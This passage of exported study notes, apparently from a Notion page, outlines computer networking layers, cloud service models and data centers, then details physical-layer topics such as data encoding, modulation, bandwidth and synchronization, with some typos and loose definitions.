style="list-style-type:square">Propagation delay (Link latency)</li></ul></li></ul><ul id="11e1a926-7344-80b8-94db-c4daa2e97c35" class="bulleted-list"><li style="list-style-type:circle">Synchronization<ul id="11e1a926-7344-80ee-8d82-ef2fad0d059c" class="bulleted-list"><li style="list-style-type:square">sender and receiver are aligned in time</li></ul><ul id="11e1a926-7344-8065-8b1c-e6d88333cefe" class="bulleted-list"><li style="list-style-type:square">Asynchronous vs Synchronous Transmission</li></ul></li></ul><ul id="11e1a926-7344-80af-a116-ef01035fcf50" class="bulleted-list"><li style="list-style-type:circle">Transmission Media<ul id="11e1a926-7344-80a9-8d73-e60218f9d408" class="bulleted-list"><li style="list-style-type:square">Guided: twisted pair, coaxial, optical fibre</li></ul><ul id="11e1a926-7344-80e3-ba45-c063bb8fdc81" class="bulleted-list"><li style="list-style-type:square">Unguided: air, atmosphere, space</li></ul></li></ul></li></ul><ul id="11e1a926-7344-80f4-85a3-c455adc88227" class="bulleted-list"><li style="list-style-type:disc">data link layer<ul id="11e1a926-7344-803c-8d51-dfb1288cd9fe" class="bulleted-list"><li style="list-style-type:circle">data link layer solves the framing, error detection and media access control issues of the physical layer</li></ul><ul id="11e1a926-7344-809f-bdac-e2485cccddc0" class="bulleted-list"><li style="list-style-type:circle">framing<ul id="11e1a926-7344-807d-ae14-c6952b0a982c" class="bulleted-list"><li style="list-style-type:square">data frame is a srequence of bits that form a unit of data</li></ul><ul id="11e1a926-7344-8094-9f40-e5fbf20872ad" class="bulleted-list"><li style="list-style-type:square">framing determines where a dataframe begins and ends</li></ul><ul id="11e1a926-7344-8072-96f4-f4d3eb1fcb02" class="bulleted-list"><li style="list-style-type:square">framing approaches<ul id="11e1a926-7344-807a-a155-e9918a2fd99c" class="bulleted-list"><li style="list-style-type:disc">flags/sentinels:<ul id="11e1a926-7344-8001-8306-c0cba5aa2b80" class="bulleted-list"><li style="list-style-type:circle">start and end of data frameare makred with speical bits</li></ul><ul id="11e1a926-7344-803c-a017-d8e986451928" class="bulleted-list"><li style="list-style-type:circle">problem is that the message can contain the special bit and incorrectly terminate reading</li></ul><ul id="11e1a926-7344-807f-97d3-dbe02b6fd74b" class="bulleted-list"><li style="list-style-type:circle">this can be fixed by bit stuffing the end of the message with a 0, the encoder used by the reciever will remove the 0</li></ul></li></ul><ul id="11e1a926-7344-8083-9027-c81e79cb0f9e" class="bulleted-list"><li style="list-style-type:disc">headers<ul id="11e1a926-7344-80d4-b830-eb67f346e395" class="bulleted-list"><li style="list-style-type:circle">length/size of message can be included in the header</li></ul><ul id="11e1a926-7344-80cc-88a4-ca80d67274aa" class="bulleted-list"><li style="list-style-type:circle">problem is that errors can occur, errors that affect the header will cause the rest of the message to be unreadable</li></ul></li></ul><ul id="11e1a926-7344-80df-840e-c379c992ce30" class="bulleted-list"><li style="list-style-type:disc">clocks<ul id="11e1a926-7344-8048-b4af-e1db08e02998" class="bulleted-list"><li style="list-style-type:circle">size of dataframe is fixed and we attach a clock that can sync the sender and reciever</li></ul></li></ul></li></ul><ul id="11e1a926-7344-80d5-ae66-d6d6d1085f79" class="bulleted-list"><li style="list-style-type:square">Header &amp; Tail<ul id="11e1a926-7344-808a-91bd-c0cec2848fb6" class="bulleted-list"><li style="list-style-type:disc">data frames need redundant information at the start and the end</li></ul></li></ul></li></ul><ul id="11e1a926-7344-802d-a57e-cbcc822c9cd4" class="bulleted-list"><li style="list-style-type:circle">error detection<ul id="11e1a926-7344-80a4-8ea8-ed149822feb7" class="bulleted-list"><li style="list-style-type:square">detection approaches<ul id="11e1a926-7344-809d-b4fe-d51ab57abb0d" class="bulleted-list"><li style="list-style-type:disc">parity check</li></ul><ul id="11e1a926-7344-80b7-9e38-d5153ac47986" class="bulleted-list"><li style="list-style-type:disc">checksum</li></ul><ul id="11e1a926-7344-806c-af7e-fd841276682a" class="bulleted-list"><li style="list-style-type:disc">CRC</li></ul></li></ul><ul id="11e1a926-7344-805d-9a08-e54052f6f2ae" class="bulleted-list"><li style="list-style-type:square">error correction codes<ul id="11e1a926-7344-80ad-8325-eaf86cd9e4b8" class="bulleted-list"><li style="list-style-type:disc">hamming codes, reed solomon code, convlution code …</li></ul></li></ul><ul id="11e1a926-7344-808a-824d-fb92b742c31f" class="bulleted-list"><li style="list-style-type:square">Forward Error Correction: adds redudancy to message</li></ul></li></ul><ul id="11e1a926-7344-80e4-97bc-eea765a7346c" class="bulleted-list"><li style="list-style-type:circle">media access control mediation<ul id="11e1a926-7344-8002-b038-e77fd03959d0" class="bulleted-list"><li style="list-style-type:square">multiple nodes may share the same link</li></ul><ul id="11e1a926-7344-80fb-aef6-c3788d5e8eea" class="bulleted-list"><li style="list-style-type:square">we want to prevent conflict</li></ul><ul id="11e1a926-7344-80ba-8810-d3daf328738b" class="bulleted-list"><li style="list-style-type:square">Channel Partitioning</li></ul><ul id="11e1a926-7344-803b-a913-fbb2f51e2bd4" class="bulleted-list"><li style="list-style-type:square">CSMA/CD</li></ul><ul id="11e1a926-7344-80b4-8274-f1972afd3cb3" class="bulleted-list"><li style="list-style-type:square">CSMA/CA</li></ul><ul id="11e1a926-7344-801a-837e-cf1fd19c769e" class="bulleted-list"><li style="list-style-type:square">MAC address</li></ul></li></ul></li></ul><ul id="11e1a926-7344-8003-a889-c67b010f6d79" class="bulleted-list"><li style="list-style-type:disc">network layer<ul id="11e1a926-7344-8026-8a1d-c2a007a1f141" class="bulleted-list"><li style="list-style-type:circle">LAN<ul id="11e1a926-7344-8004-95bf-dd6021ecd877" class="bulleted-list"><li style="list-style-type:square">Switches<ul id="11e1a926-7344-80ce-b7f1-c80334806c72" class="bulleted-list"><li style="list-style-type:disc">switching</li></ul><ul id="11e1a926-7344-802a-be2a-c8e7905060b3" class="bulleted-list"><li style="list-style-type:disc">connected vs connectionless</li></ul><ul id="11e1a926-7344-804f-9d20-fd6720e5cc23" class="bulleted-list"><li style="list-style-type:disc">switching tech<ul id="11e1a926-7344-8064-9e1a-d649c91f8e7b" class="bulleted-list"><li style="list-style-type:circle">datagrams</li></ul><ul id="11e1a926-7344-8088-8ad6-cb5975dc75a4" class="bulleted-list"><li style="list-style-type:circle">virtual circuit switching</li></ul><ul id="11e1a926-7344-80be-8227-cb04a0aac52d" class="bulleted-list"><li style="list-style-type:circle">source routing</li></ul></li></ul></li></ul><ul id="11e1a926-7344-80d0-a52d-d8fba803661d" class="bulleted-list"><li style="list-style-type:square">Hubs</li></ul><ul id="11e1a926-7344-8000-a3a3-f51f20c87498" class="bulleted-list"><li style="list-style-type:square">Star Topology</li></ul><ul id="11e1a926-7344-8090-919b-e20df059bde3" class="bulleted-list"><li style="list-style-type:square">building forwarding table with ethernet without loops</li></ul></li></ul><ul id="11e1a926-7344-8011-a6bf-fca80d562f48" class="bulleted-list"><li style="list-style-type:circle">inter networking and Internet protocol<ul id="11e1a926-7344-8049-a3b3-ecaa8909d04f" class="bulleted-list"><li style="list-style-type:square">IP packet structure</li></ul><ul id="11e1a926-7344-80ea-a529-d57d2620da7d" class="bulleted-list"><li style="list-style-type:square">Fragmentation and Reassembly</li></ul><ul id="11e1a926-7344-8071-aaf8-f33526b7e38d" class="bulleted-list"><li style="list-style-type:square">IPv6</li></ul><ul id="11e1a926-7344-808b-ba9c-e511df5e8490" class="bulleted-list"><li style="list-style-type:square">IPv4</li></ul><ul id="11e1a926-7344-8021-8fb4-eab1df4b257e" class="bulleted-list"><li style="list-style-type:square">IP forwarding: longest prefix match</li></ul><ul id="11e1a926-7344-80c5-a999-e74eaa8422fc" class="bulleted-list"><li style="list-style-type:square">Address Resolution Protocol (ARP)</li></ul><ul id="11e1a926-7344-80a6-9e56-d03345ea96f5" class="bulleted-list"><li style="list-style-type:square">Dynamic Host Configuration Protocol (DHCP)</li></ul><ul id="11e1a926-7344-80e4-a975-e5f4770f1172" class="bulleted-list"><li style="list-style-type:square">Internet Control Message Protocol (ICMP)</li></ul></li></ul><ul id="11e1a926-7344-8042-beb7-f2e51c0464d8" class="bulleted-list"><li style="list-style-type:circle">routing protocols<ul id="11e1a926-7344-806b-bcfa-cb1b4f5003f0" class="bulleted-list"><li style="list-style-type:square">forwarding vs routing</li></ul><ul id="11e1a926-7344-8010-bb41-fc10e71ccbed" class="bulleted-list"><li style="list-style-type:square">data plane vs control plane</li></ul><ul id="11e1a926-7344-8036-a3d9-e6493b6ba95d" class="bulleted-list"><li style="list-style-type:square">Distance Vector</li></ul><ul id="11e1a926-7344-8033-93ee-c9b51424fa64" class="bulleted-list"><li style="list-style-type:square">Link State</li></ul><ul id="11e1a926-7344-80dd-801e-f7fb89e4c189" class="bulleted-list"><li style="list-style-type:square">Routing Area</li></ul><ul id="11e1a926-7344-8023-a514-fbd8e3f214ef" class="bulleted-list"><li style="list-style-type:square">Interdomain Routing</li></ul></li></ul></li></ul><ul id="11e1a926-7344-8035-883a-f6f9c18d14b7" class="bulleted-list"><li style="list-style-type:disc">transport layer<ul id="11e1a926-7344-809a-85e6-f23a9a103317" class="bulleted-list"><li style="list-style-type:circle">transport layer is communciaiton to applications/processon end hosts</li></ul><ul id="11e1a926-7344-8023-b045-d07d565757a0" class="bulleted-list"><li style="list-style-type:circle">(UDP) end to end communication: 2 nodes connected directly <ul id="11e1a926-7344-8025-bde7-fc412adb9e3f" class="bulleted-list"><li style="list-style-type:square">transport layer must work with IP’s best effort delivery which has issues</li></ul><ul id="11e1a926-7344-80ae-8cde-c5cbccedfe5d" class="bulleted-list"><li style="list-style-type:square">user datagram protocol</li></ul><ul id="11e1a926-7344-80df-86e0-e89ada7b074a" class="bulleted-list"><li style="list-style-type:square">Multiplexing and Demultiplexing</li></ul><ul id="11e1a926-7344-80b3-b07f-c98777b374de" class="bulleted-list"><li style="list-style-type:square">Ports</li></ul><ul id="11e1a926-7344-8021-8088-c34155de8bd9" class="bulleted-list"><li style="list-style-type:square">Encapsulation and Decapsulation</li></ul></li></ul><ul id="11e1a926-7344-802c-92c0-e1f48f257abf" class="bulleted-list"><li style="list-style-type:circle">TCP<ul id="11e1a926-7344-8062-90b7-eaed8c381d0b" class="bulleted-list"><li style="list-style-type:square">supports things UDP doesn’t</li></ul><ul id="11e1a926-7344-8021-b3de-d7c175c5169b" class="bulleted-list"><li style="list-style-type:square">byte oreinted TCP</li></ul><ul id="11e1a926-7344-80f5-a43f-fc025cb62543" class="bulleted-list"><li style="list-style-type:square">TCP header</li></ul><ul id="11e1a926-7344-8021-8ff7-d963aea7e490" class="bulleted-list"><li style="list-style-type:square">socket API</li></ul><ul id="11e1a926-7344-80b9-855e-fd0a014a89f3" class="bulleted-list"><li style="list-style-type:square">Reliable Transmission<ul id="11e1a926-7344-800a-9b22-dcbabed09dd5" class="bulleted-list"><li style="list-style-type:disc">stop and wait: ARQ</li></ul><ul id="11e1a926-7344-8052-86f8-c35c8714e494" class="bulleted-list"><li style="list-style-type:disc">sliding window</li></ul></li></ul><ul id="11e1a926-7344-80d9-8395-da64fa4cb674" class="bulleted-list"><li style="list-style-type:square">Connection Establishment and Termination</li></ul><ul id="11e1a926-7344-80a2-8c38-fff9668864dd" class="bulleted-list"><li style="list-style-type:square">TCP’s Sliding Window</li></ul></li></ul></li></ul><ul id="11e1a926-7344-8071-af52-f806a4da4710" class="bulleted-list"><li style="list-style-type:disc">application layer<ul id="11e1a926-7344-803d-af50-ef84a44f3989" class="bulleted-list"><li style="list-style-type:circle">application protocols</li></ul><ul id="11e1a926-7344-8039-8e81-c3f35f7689b7" class="bulleted-list"><li style="list-style-type:circle">application layer vs applications</li></ul><ul id="11e1a926-7344-808d-bd70-c84dde9dd012" class="bulleted-list"><li style="list-style-type:circle">HTTP<ul id="11e1a926-7344-804d-b89d-e34866ea8f86" class="bulleted-list"><li style="list-style-type:square">protocol</li></ul><ul id="11e1a926-7344-802c-ac2d-f5d7db81a7b7" class="bulleted-list"><li style="list-style-type:square">client to server paradigm</li></ul><ul id="11e1a926-7344-805d-8e76-ea52f1f6982f" class="bulleted-list"><li style="list-style-type:square">message format</li></ul><ul id="11e1a926-7344-80b9-9700-e6a0647d946f" class="bulleted-list"><li style="list-style-type:square">request operations/methods</li></ul><ul id="11e1a926-7344-805e-9d8b-cc939170df38" class="bulleted-list"><li style="list-style-type:square">url structure</li></ul><ul id="11e1a926-7344-8044-af8c-e721f5e352bb" class="bulleted-list"><li style="list-style-type:square">status codes</li></ul><ul id="11e1a926-7344-80e9-b484-ed9afac14292" class="bulleted-list"><li style="list-style-type:square">versions</li></ul></li></ul><ul id="11e1a926-7344-8015-ace0-de261b9a7b1b" class="bulleted-list"><li style="list-style-type:circle">HTML and XML presentation</li></ul><ul id="11e1a926-7344-80b5-8793-ff5034aa011b" class="bulleted-list"><li style="list-style-type:circle">DNS<ul id="11e1a926-7344-805e-a86d-c81e0ff3ace8" class="bulleted-list"><li style="list-style-type:square">people don’t want to remember IP address, so give a domain name (google.com) to the address (1.1.243.123.13)</li></ul><ul id="11e1a926-7344-8006-a353-dc906297316e" class="bulleted-list"><li style="list-style-type:square">domain Hierarchy</li></ul><ul id="11e1a926-7344-80f1-9ccf-c738a1a59782" class="bulleted-list"><li style="list-style-type:square">query resolution</li></ul></li></ul></li></ul><ul id="11e1a926-7344-8050-b590-d7e0b67688a0" class="bulleted-list"><li style="list-style-type:disc">cloud computing<ul id="11e1a926-7344-8098-99d9-c8cd80dd651d" class="bulleted-list"><li style="list-style-type:circle">tier 1: we have the machinery, networking, application</li></ul><ul id="11e1a926-7344-8044-bf02-c6672098058a" class="bulleted-list"><li style="list-style-type:circle">depending on what people want, we can get different types of clouds such as IAAS, PAAS and SAAS</li></ul><ul id="11e1a926-7344-805a-8b6f-f2866441dac1" class="bulleted-list"><li style="list-style-type:circle">Utility Computing</li></ul><ul id="11e1a926-7344-80b6-91f1-ce920fbdeab0" class="bulleted-list"><li style="list-style-type:circle">cloud vs data center</li></ul><ul id="11e1a926-7344-80ce-aa35-f209366dbecb" class="bulleted-list"><li style="list-style-type:circle">re allocating IT expenditures</li></ul><ul id="11e1a926-7344-80a9-8491-e7f1b866e8b4" class="bulleted-list"><li style="list-style-type:circle">characterisitcs of cloud (dev and user perspective)</li></ul><ul id="11e1a926-7344-8047-b518-cb8640f6bb26" class="bulleted-list"><li style="list-style-type:circle">Scalability and Elasticity </li></ul><ul id="11e1a926-7344-800a-8096-dfdd92d6029d" class="bulleted-list"><li style="list-style-type:circle">Resource Provisioning </li></ul></li></ul><ul id="11e1a926-7344-8085-beb4-c70e1ac76a99" class="bulleted-list"><li style="list-style-type:disc">Virtualization<ul id="11e1a926-7344-80a6-bed4-c942ece5eaad" class="bulleted-list"><li style="list-style-type:circle">Servers</li></ul><ul id="11e1a926-7344-80d7-a919-da36b39fffaf" class="bulleted-list"><li style="list-style-type:circle">VMS</li></ul><ul id="11e1a926-7344-8040-93f9-d9479052a53c" class="bulleted-list"><li style="list-style-type:circle">VMM</li></ul><ul id="11e1a926-7344-807b-9a6b-d0c1f8db194d" class="bulleted-list"><li style="list-style-type:circle">VPC</li></ul><ul id="11e1a926-7344-807e-8dce-c2929bd2b417" class="bulleted-list"><li style="list-style-type:circle">AMI</li></ul></li></ul><ul id="11e1a926-7344-802c-90b8-fbc59a3958c4" class="bulleted-list"><li style="list-style-type:disc">Service Models<ul id="11e1a926-7344-8047-95d7-eb578c134a04" class="bulleted-list"><li style="list-style-type:circle">Infrastructure as a Service</li></ul><ul id="11e1a926-7344-80ef-8eb7-da3c54f6710c" class="bulleted-list"><li style="list-style-type:circle">Platform as a Service<ul id="11e1a926-7344-8087-b7c0-c3386dad333b" class="bulleted-list"><li style="list-style-type:square">Alot of data problem</li></ul><ul id="11e1a926-7344-8092-af18-d142fdf7188b" class="bulleted-list"><li style="list-style-type:square">Map Reduce</li></ul></li></ul><ul id="11e1a926-7344-80e8-97cd-fb91156f7d5a" class="bulleted-list"><li style="list-style-type:circle">Serverless<ul id="11e1a926-7344-80e9-8059-e22b6a7a761d" class="bulleted-list"><li style="list-style-type:square">Containers and Functions</li></ul><ul id="11e1a926-7344-80a4-b698-fd6238f539a5" class="bulleted-list"><li style="list-style-type:square">ECS and Fargate</li></ul><ul id="11e1a926-7344-80f0-a76d-cee73e65f9d5" class="bulleted-list"><li style="list-style-type:square">Monolithic Applications vs Microservices</li></ul><ul id="11e1a926-7344-804e-9e8c-dd04af1a7d7d" class="bulleted-list"><li style="list-style-type:square">Docker Containers</li></ul></li></ul><ul id="11e1a926-7344-8060-8238-f62be81a5071" class="bulleted-list"><li style="list-style-type:circle">Function as a service<ul id="11e1a926-7344-8065-bc28-f1b29163f0c2" class="bulleted-list"><li style="list-style-type:square">FasS vs Micro Services</li></ul><ul id="11e1a926-7344-805e-b204-ef1d81d4f250" class="bulleted-list"><li style="list-style-type:square">scale &amp; fault tolerance</li></ul><ul id="11e1a926-7344-80a9-9977-d0d92d33c166" class="bulleted-list"><li style="list-style-type:square">FasS Micro Service Example</li></ul><ul id="11e1a926-7344-80d7-a41d-fcf9af916d9c" class="bulleted-list"><li style="list-style-type:square">AWS Lambdas</li></ul><ul id="11e1a926-7344-8020-a5b7-ecc56f3ffc74" class="bulleted-list"><li style="list-style-type:square">Latancy</li></ul></li></ul><ul id="11e1a926-7344-8004-8508-efc6d5220e46" class="bulleted-list"><li style="list-style-type:circle">Containers as a service<ul id="11e1a926-7344-8048-9680-e1feaf7e7c48" class="bulleted-list"><li style="list-style-type:square">image registries</li></ul><ul id="11e1a926-7344-802e-ae62-f867de5baa3b" class="bulleted-list"><li style="list-style-type:square">docker images</li></ul><ul id="11e1a926-7344-8043-821d-c04afee5874e" class="bulleted-list"><li style="list-style-type:square">container vs PasS</li></ul></li></ul></li></ul><ul id="11e1a926-7344-80d5-8262-e73884e54586" class="bulleted-list"><li style="list-style-type:disc">Cloud ≠ big compute<ul id="11e1a926-7344-80ae-8710-eb4d2f57cd4c" class="bulleted-list"><li style="list-style-type:circle">Storage<ul id="11e1a926-7344-8013-bd8c-e82750cef84d" class="bulleted-list"><li style="list-style-type:square">EBS</li></ul><ul id="11e1a926-7344-801e-9e4c-dc3b23a02c4e" class="bulleted-list"><li style="list-style-type:square">S3</li></ul><ul id="11e1a926-7344-805b-9971-fffda9e0bff2" class="bulleted-list"><li style="list-style-type:square">EFS</li></ul></li></ul><ul id="11e1a926-7344-80ac-9e7d-f6c53b22bf46" class="bulleted-list"><li style="list-style-type:circle">Scaling = Replication</li></ul></li></ul><ul id="11e1a926-7344-80d5-b522-c316109f47e8" class="bulleted-list"><li style="list-style-type:disc">Parallel and Scale<ul id="11e1a926-7344-80e1-9c29-ea21dc29a456" class="bulleted-list"><li style="list-style-type:circle">Distributed problem<ul id="11e1a926-7344-807c-83e5-ed595bfe7f80" class="bulleted-list"><li style="list-style-type:square">parallelisum</li></ul><ul id="11e1a926-7344-80d8-8244-e3e85973c92a" class="bulleted-list"><li style="list-style-type:square">embarasingly parallel</li></ul></li></ul><ul id="11e1a926-7344-80d9-9b38-d348f9293b17" class="bulleted-list"><li style="list-style-type:circle">Distributed Systems</li></ul><ul id="11e1a926-7344-80b1-8cdc-fac960e18c27" class="bulleted-list"><li style="list-style-type:circle">parallel computing programming modelk</li></ul><ul id="11e1a926-7344-80e9-aeab-f434075f67b3" class="bulleted-list"><li style="list-style-type:circle">FLYNN’S TAXONOMY</li></ul><ul id="11e1a926-7344-8099-875b-df5c3f295141" class="bulleted-list"><li style="list-style-type:circle">Parallel vs Distributed</li></ul><ul id="11e1a926-7344-8064-bd81-da4098e1ca09" class="bulleted-list"><li style="list-style-type:circle">Parallel Archecture</li></ul></li></ul><ul id="11e1a926-7344-80f7-bd9f-c643914d9edb" class="bulleted-list"><li style="list-style-type:disc">Data Centers<ul id="11e1a926-7344-8094-a4fc-c96a0975da1f" class="bulleted-list"><li style="list-style-type:circle">cost</li></ul><ul id="11e1a926-7344-8012-9afe-fece85f9c3b5" class="bulleted-list"><li style="list-style-type:circle">challanges</li></ul><ul id="11e1a926-7344-8046-93b2-fb0c80993be2" class="bulleted-list"><li style="list-style-type:circle">basic building blocks</li></ul><ul id="11e1a926-7344-804b-b544-cbbeb4d94039" class="bulleted-list"><li style="list-style-type:circle">storeage hierahcy </li></ul><ul id="11e1a926-7344-80df-9eb6-f5f9577b2134" class="bulleted-list"><li style="list-style-type:circle">locality </li></ul><ul id="11e1a926-7344-80a3-b71b-e103c31e62da" class="bulleted-list"><li style="list-style-type:circle">global impact</li></ul><ul id="11e1a926-7344-8056-9e85-db953ba63e89" class="bulleted-list"><li style="list-style-type:circle">data center automation</li></ul></li></ul><ul id="11e1a926-7344-801f-9212-fd3de5c68728" class="bulleted-list"><li style="list-style-type:disc">Green Computing<ul id="11e1a926-7344-80ef-86bf-f7f743f1e9ca" class="bulleted-list"><li style="list-style-type:circle">strats</li></ul></li></ul><ul id="11e1a926-7344-80f5-823f-f5649a333b7c" class="bulleted-list"><li style="list-style-type:disc">Replication and Failure </li></ul></details></li></ul><ul id="11e1a926-7344-8012-9157-c36c820fa36f" class="toggle"><li><details><summary>Physical Layer (L1)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11e1a926-7344-8011-bd99-c7127150830e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="26c7280f-15a1-4a19-a314-ce092bf3f576" class="">physical layer <mark class="highlight-yellow">encodes data </mark>(to bits and signals) and <mark class="highlight-yellow">transmits </mark>the bitstream over the physical transmission <mark class="highlight-yellow">medium</mark>/<mark class="highlight-yellow">communication channel</mark></p><ul id="11f1a926-7344-80b3-be93-e2e562525801" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-orange_background">convert bits into signals</mark> suitable for the transmission medium</li></ul><ul id="11f1a926-7344-802d-9a59-d4dfc3c7daac" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-orange_background">synchronization </mark>(two things being on the same time)</li></ul></div></figure><ul id="11e1a926-7344-8011-bdb5-f859d8068aa8" class="toggle"><li><details><summary>Representing Data as Bits</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11e1a926-7344-80ff-8314-c9ae45641b76"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="8196ea2e-dfa6-48ff-956e-b5662aa346a7" class="">we want our network to be able to <mark class="highlight-yellow_background">transfer any kind of information</mark><br/><br/><mark class="highlight-yellow_background">any data can be represented in binary</mark>, as its the most fundamental way to compute</p></div></figure><h3 id="11f1a926-7344-80d6-9021-fa8cd67a7880" class="">Numbers → Binary</h3><p id="11f1a926-7344-8079-92b6-fd8a7518a9d1" class="">directly convert base10 to base2</p><figure id="11f1a926-7344-80a9-9687-dddf2cf05588" class="image"><a href="Untitled%2012.png"><img style="width:623.96875px" src="Untitled%2012.png"/></a></figure><h3 id="11f1a926-7344-8082-9b99-c26e456ccc5d" class="">Text →Binary</h3><p id="11f1a926-7344-80cf-8e84-e8885c7ae596" class="">letters/symbols encoded to an integer number using a lookup ta</p><figure id="11f1a926-7344-80e5-a559-d4a2691a42fb" class="image"><a href="8c3ae4db-8ac7-44d0-a524-8f868efe9129.png"><img style="width:475.5515695067264px" src="8c3ae4db-8ac7-44d0-a524-8f868efe9129.png"/></a></figure><h3 id="11f1a926-7344-80f0-b747-f2baec97cee4" class="">Images → Binary</h3><p id="11f1a926-7344-80c9-8a0c-e6638700cdff" class="">convert images to a 2d array of RGB values</p><figure id="11f1a926-7344-80f7-81a2-f3bf59286907" class="image"><a href="Untitled%2013.png"><img style="width:623.984375px" src="Untitled%2013.png"/></a></figure><h3 id="11f1a926-7344-80a7-8f4b-f3e2f990b194" class="">Audio → Binary</h3><p id="11f1a926-7344-8038-ad27-f273bf40965f" class="">convert audio to binary by sampling and quantizing a wave </p><p id="11f1a926-7344-80c3-9ecb-fc9d9b068e1a" class="">values can be used to reconstruct the wave</p><figure id="11f1a926-7344-8072-a949-fa65abd3a002" class="image"><a href="Untitled%2014.png"><img style="width:602px" src="Untitled%2014.png"/></a></figure><h3 id="11f1a926-7344-8023-9038-e42b87cec40e" class="">Video → Binary</h3><p id="11f1a926-7344-80d1-9be3-ec7f5e09ae1e" class="">video is just a sequence of images and audio</p><p id="11f1a926-7344-8072-b8bc-c79b6f5bc762" class="">additionally and reduce redundant information in previous frames with encoders</p><figure id="11f1a926-7344-80c2-992b-d66e903a9b92" class="image"><a href="Untitled%2015.png"><img style="width:608px" src="Untitled%2015.png"/></a></figure></details></li></ul><ul id="11e1a926-7344-8006-a24b-da390bbbf37e" class="toggle"><li><details><summary>Modulation</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8068-8711-f72d4c7c2676"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="ebc7bed0-7c14-46d6-9e6c-d864ea62b661" class=""><mark class="highlight-yellow">process of converting bits into signals suitable</mark> to be transferred over the medium</p><ul id="11f1a926-7344-8031-98cb-df38af9452f1" class="bulleted-list"><li style="list-style-type:disc">reverse process = demodulation</li></ul><ul id="11f1a926-7344-802f-bc82-c3f99c4534c8" class="bulleted-list"><li style="list-style-type:disc">modem is a device responsible for modulation, demodulation and synchronization</li></ul></div></figure><h3 id="11f1a926-7344-800a-8ede-f934df21e351" class="">Analog vs Digital </h3><ul id="11f1a926-7344-803d-931d-c787ca017613" class="bulleted-list"><li style="list-style-type:disc">analog data is continues</li></ul><ul id="11f1a926-7344-804a-a2fa-c63edd6dd81a" class="bulleted-list"><li style="list-style-type:disc">digital data is discrete</li></ul><ul id="11f1a926-7344-801a-8490-f254836973a0" class="bulleted-list"><li style="list-style-type:disc">analog data needs to be quantized to be digital</li></ul><ul id="11f1a926-7344-8039-98e9-d0ad315b725c" class="bulleted-list"><li style="list-style-type:disc">lost information from analog to digital is very small or nothing</li></ul></details></li></ul><ul id="11e1a926-7344-80ce-b82c-ca6f75ccc346" class="toggle"><li><details><summary>Bandwidth</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8027-af00-eca34dfe882c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="c047f744-1ace-4094-a092-9a6e0750b101" class=""><mark class="highlight-yellow">maximum rate</mark> at which information can <mark class="highlight-yellow">theoretically </mark>be <mark class="highlight-yellow">transferred over a channel</mark> (recoverably) </p><ul id="11f1a926-7344-807d-9db0-fbd8aa9a8462" class="bulleted-list"><li style="list-style-type:disc">measured in bits per second (bps)</li></ul><ul id="11f1a926-7344-80b6-a9eb-fc371307e85f" class="bulleted-list"><li style="list-style-type:disc">throughput is the rate at which information can <mark class="highlight-yellow">practically </mark>be transfused  </li></ul></div></figure><h3 id="11f1a926-7344-8013-92b2-c298d749f13b" class="">Signal Degradation (Throughput Limitation)</h3><p id="1261a926-7344-80b0-b2cc-f15ab27904fc" class="">theoretically <mark class="highlight-yellow_background">increasing clock or bps </mark>increases throughput, however this introduces <mark class="highlight-yellow_background">introduces distortion caused by noise and interferences </mark></p><figure id="11f1a926-7344-80e2-86cf-efcd73fa8db1" class="image"><a href="Untitled%2016.png"><img style="width:336px" src="Untitled%2016.png"/></a><figcaption>- attenuation: weakening of signal over distance <br/>- fading: weakening can vary (person walks by, car passed by ect)<br/>- interference: you’re not the only 2 people communicating, and other signals interfere with your signal <br/>- limited bandwidth distortion<br/>- delay distortion<br/>- multipath distortion<br/>- reflection, refraction, scattering: when it rains, signals are worse<br/>line noise &amp;  eceiver noise<br/></figcaption></figure><h3 id="11f1a926-7344-80a7-a181-d6bafdd0f8d0" class="">Propagation Delay (Link Latency)</h3><p id="11f1a926-7344-800c-9a79-c92abb5c798c" class="">time <mark class="highlight-yellow_background">delay between sending an receiving</mark> a signal </p><ul id="11f1a926-7344-8076-856a-e67147f7d608" class="bulleted-list"><li style="list-style-type:disc">AKA lag</li></ul><ul id="11f1a926-7344-80b5-8b9e-e0604ae63816" class="bulleted-list"><li style="list-style-type:disc">measured in time</li></ul><ul id="11f1a926-7344-8004-a50f-d6a134ab2567" class="bulleted-list"><li style="list-style-type:disc">independent notion from bandwidth</li></ul><ul id="11f1a926-7344-8006-8c4b-c0ca8a78eb46" class="bulleted-list"><li style="list-style-type:disc">affected by length and material of the channel </li></ul></details></li></ul><ul id="11e1a926-7344-8008-a23a-e120fc256957" class="toggle"><li><details><summary>Synchronization</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-809c-be4b-e3299751e2d2"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="148c3c4a-564f-4532-a756-9b345192c98d" class="">ensuring <mark class="highlight-yellow_background">sender and receiver are aligned in time</mark> to interpret bits accurately and in order </p></div></figure><h3 id="11f1a926-7344-8021-aa20-ea6644d1d369" class="">Synchronous Transmission</h3><p id="11f1a926-7344-80f5-bb51-fa7f60bdd416" class="">data is <mark class="highlight-yellow_background">transmitted in a continues, sequential stream</mark></p><p id="11f1a926-7344-80ec-b01f-e5353c2b1667" class="">synchronization is ensured by<mark class="highlight-yellow_background"> attaching a clock</mark> signal along with the data</p><p id="11f1a926-7344-80c9-8acb-d1d54e281b4f" class="">clock can be embedded within the signal itself (eg: with ethernet)</p><figure id="11f1a926-7344-805f-8d78-eb36c2154685" class="image"><a href="image%2027.png"><img style="width:624.0625px" src="image%2027.png"/></a></figure><p id="11f1a926-7344-80bb-bbf1-ed0c15478485" class=""> </p><h3 id="11f1a926-7344-80a0-98a9-fbf5854b46b3" class="">Asynchronous Transmission</h3><p id="11f1a926-7344-809d-8a0f-ee784b4bb90a" class="">data is transmitted out of order</p><figure id="11f1a926-7344-8067-a8b3-d4dbf24f80ba" class="image"><a href="Untitled%2017.png"><img style="width:566.9176025390625px" 